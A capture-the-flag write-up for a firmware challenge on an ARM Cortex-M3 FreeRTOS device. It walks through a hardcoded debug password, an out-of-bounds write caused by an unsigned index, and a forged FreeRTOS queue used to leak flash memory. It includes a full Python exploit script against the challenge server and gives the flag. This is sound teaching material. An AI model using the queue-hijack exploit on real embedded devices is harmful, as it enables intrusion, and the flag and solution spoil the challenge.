# Carbon Noneoxide - Solve & Writeup

## Challenge Information
- **Category:** Binary Exploitation / Firmware Reverse Engineering
- **Points:** 10
- **Author:** Veryyes
- **Files Provided:** `carbon-noneoxide.zip`
  - `ChudMaxxing_AirSensor_v1.23.0_ProductSheet.pdf`
  - `firmware.bin.chal`
- **Description:** 
  > There's a weird port open on my smart carbon monoxide detector.
  >
  > Here's the firmware from their website. Kinda weird website ngl.
  >
  > Mirror 1: `nc 18.215.143.250 1337`  
  > Mirror 2: `nc 18.145.136.91 1337`

---

## 1. Challenge Overview & Architecture

The provided challenge binary `firmware.bin.chal` is a raw flat firmware image compiled for an **ARM Cortex-M3 (LM3S6965)** microcontroller running the **FreeRTOS** real-time operating system.

When booting up, the firmware initializes three tasks:
1. **Sensor Task:** Generates simulated carbon monoxide (CO) sensor readings in a loop using a pseudo-random Linear Congruential Generator (LCG) and posts readings into a queue.
2. **Monitor Task:** Continuously receives readings from the queue via `xQueueReceive(xSensorQueue, &reading, portMAX_DELAY)`. If `reading <= 75`, it logs `[Monitor] OK (reading <= 75)`. If `reading > 75`, it triggers an alert:
   ```text
   [ALERT] Threshold exceeded! Reading = <reading> > 75
   ```
3. **Admin Task:** Listens on UART / standard I/O for authentication and provides an interactive debug shell.

---

## 2. Reverse Engineering & Reconnaissance

### Admin Shell Authentication
Disassembling the Admin task (`0x18b0`):
- The task awaits input via `fgets(buf, 0x80)`.
- It executes `strcmp(buf, "charlotte")`.
- Entering password `charlotte` unlocks the debug shell:
  ```text
  --- Debug Shell ---
  Device : LM3S6965 (Cortex-M3)
  Sensor : virtual CO2 sensor
  -------------------
  $
  ```

### Shell Commands
The command dispatcher (`0x17a0`) uses a Thumb `tbb` jump table for single-letter commands:
- `s`: **Suspend** sensor task (`vTaskSuspend(xSensorTaskHandle)`), stopping the periodic sensor output.
- `r`: **Resume** sensor task (`vTaskResume(xSensorTaskHandle)`).
- `h`: Prints empty help string.
- `x`: Exits the debug shell back to authentication.
- `i`: **Inject reading** (`0x17c8`). Reads an integer on the subsequent line, posts it to `xSensorQueue`, and stores it in the reading history array.

---

## 3. Vulnerability Analysis: Out-of-Bounds Queue Overwrite

### Memory Layout
Inspecting the global variable offsets in SRAM (`0x20000000`–`0x20010000`):
- `0x2000613c`: `uint8_t reading_index`
- `0x20006140`: `uint32_t reading_history[128]` (512 bytes, indices `0` to `127`)
- `0x20006340`: `QueueHandle_t xSensorQueue` (at index `128`)
- `0x20006344`: `TaskHandle_t xSensorTaskHandle` (at index `129`)

### Out-of-Bounds Write in Command `i`
In the `Sensor` task, `reading_index` is loaded with `ldrsb` (signed 8-bit), resetting to 0 when index reaches 128:
```arm
0x1da4: ldrsb.w r3, [r4]
0x1da8: cmp r3, #0
0x1daa: itt lt
0x1dac: movlt r3, #0
```
However, in debug command `i` (`0x17c8`), `reading_index` is loaded as an **unsigned byte** with `ldrb`:
```arm
0x182a: ldr r2, =0x2000613c
0x182c: ldrb r3, [r2]               ; unsigned 0..255
0x182e: ldr r1, =0x20006140         ; reading_history
0x1830: ldr r0, [sp, #4]            ; injected value
0x1832: str.w r0, [r1, r3, lsl #2]  ; reading_history[reading_index] = value
0x1836: adds r3, #1
0x1838: strb r3, [r2]
```
Because there is no upper-bound check on `r3`, command `i` allows writing up to index 255.
Specifically:
- Writing index `128` (`0x20006140 + 128 * 4`) overwrites **`xSensorQueue`**!

---

## 4. Exploitation: FreeRTOS Queue Hijacking (`y0ur_Q_my_Q`)

### The FreeRTOS Queue Read Primitive
When the `Monitor` task calls `xQueueReceive(xSensorQueue, &reading, portMAX_DELAY)`:
FreeRTOS executes `prvCopyDataFromQueue` (`0xfbc`):
```arm
0x0fc4: mov r0, r1         ; r0 = dest (&reading)
0x0fc6: ldr r1, [r3, #0xc] ; r1 = pxQueue->u.pcReadFrom (offset 0xc = 12)
0x0fc8: add r1, r2         ; r1 += pxQueue->uxItemSize (4)
0x0fca: str r1, [r3, #0xc] ; pcReadFrom = r1
...
0x0fd8: ldr r1, [r3, #0xc] ; r1 = pcReadFrom
0x0fda: bl memcpy          ; memcpy(&reading, pcReadFrom, uxItemSize)
```
If `xSensorQueue` is redirected to a fake `QueueDefinition` structure:
- `pcReadFrom` controls where `memcpy` reads from!
- The `Monitor` task will read 4 bytes from `pcReadFrom`, store them in `reading`, and immediately print them as an integer:
  ```text
  [ALERT] Threshold exceeded! Reading = <leaked_32bit_int> > 75
  ```

### Locating the Flag
In the firmware Flash memory:
- `0x22d4`: `)\n\0\0`
- `0x22d8`: `rstcon{...}` (flag string address in ROM)

By placing a fake queue structure within `reading_history` (e.g., at index 10, address `0x20006168`):
- `offset 0x00` (`pcHead`): `0x22d4`
- `offset 0x08` (`pcTail`): `0xffffffff`
- `offset 0x0c` (`pcReadFrom`): `0x22d4` (will increment to `0x22d8` upon read)
- `offset 0x38` (`uxMessagesWaiting`): `10`
- `offset 0x3c` (`uxLength`): `10`
- `offset 0x40` (`uxItemSize`): `4`

Writing index 128 with `0x20006168` overwrites `xSensorQueue` with our fake queue. The `Monitor` task instantly consumes the queue, reading successive 4-byte chunks of the flag and printing them as integers.

---

## 5. Exploit Script

```python
#!/usr/bin/env python3
import socket, time, struct

HOST = "18.215.143.250"
PORT = 1337

s = socket.create_connection((HOST, PORT), timeout=15)
buf = b""
time.sleep(1)
while True:
    chunk = s.recv(4096)
    buf += chunk
    if b"[Sensor] Reading" in buf:
        break

# Authenticate and suspend noisy sensor task
s.sendall(b"charlotte\ns\n")
time.sleep(1)
while True:
    chunk = s.recv(4096)
    buf += chunk
    if b"[DBG] Sensor task suspended" in buf:
        break

current_idx = buf.count(b"[Sensor] Reading")
print(f"[*] Starting at reading_index = {current_idx}")

# Fake queue at index 10 (address 0x20006168)
Q_BASE = 10
Q_ADDR = 0x20006140 + Q_BASE * 4

target_map = {
    Q_BASE + 0: 0x22d4,         # pcHead
    Q_BASE + 2: 0xffffffff,     # pcTail
    Q_BASE + 3: 0x22d4,         # pcReadFrom (0x22d8 - 4)
    Q_BASE + 14: 10,            # uxMessagesWaiting
    Q_BASE + 15: 10,            # uxLength
    Q_BASE + 16: 4,             # uxItemSize
    128: Q_ADDR                 # Overwrite xSensorQueue pointer
}

print("[*] Injecting fake queue into reading_history and overwriting xSensorQueue...")
for idx in range(current_idx, 129):
    val = target_map.get(idx, 0)
    s.sendall(f"i\n{val}\n".encode())
    time.sleep(0.04)

time.sleep(2)
resp = s.recv(8192).decode("utf-8", "replace")

# Extract leaked values from Alert responses
leaked_ints = []
for line in resp.splitlines():
    if "Reading =" in line:
        val = int(line.split("Reading =")[1].split(">")[0].strip())
        leaked_ints.append(val)

flag_bytes = b"".join(struct.pack("<I", n) for n in leaked_ints if n > 0x100000)
flag = flag_bytes.split(b"\x00")[0].decode("ascii", "ignore")
print(f"\n[+] Flag: {flag}")
s.close()
```

---

## 6. Execution Output & Flag

```text
[ALERT] Threshold exceeded! Reading = 1668576114 > 75
[ALERT] Threshold exceeded! Reading = 2038132335 > 75
[ALERT] Threshold exceeded! Reading = 1601336624 > 75
[ALERT] Threshold exceeded! Reading = 2037210961 > 75
[ALERT] Threshold exceeded! Reading = 8212831 > 75
```

Decoding each 32-bit little-endian integer:
- `1668576114` $\rightarrow$ `rstc`
- `2038132335` $\rightarrow$ `on{y`
- `1601336624` $\rightarrow$ `0ur_`
- `2037210961` $\rightarrow$ `Q_my`
- `8212831` $\rightarrow$ `_Q}\x00`

### Final Flag
```text
rstcon{y0ur_Q_my_Q}
```
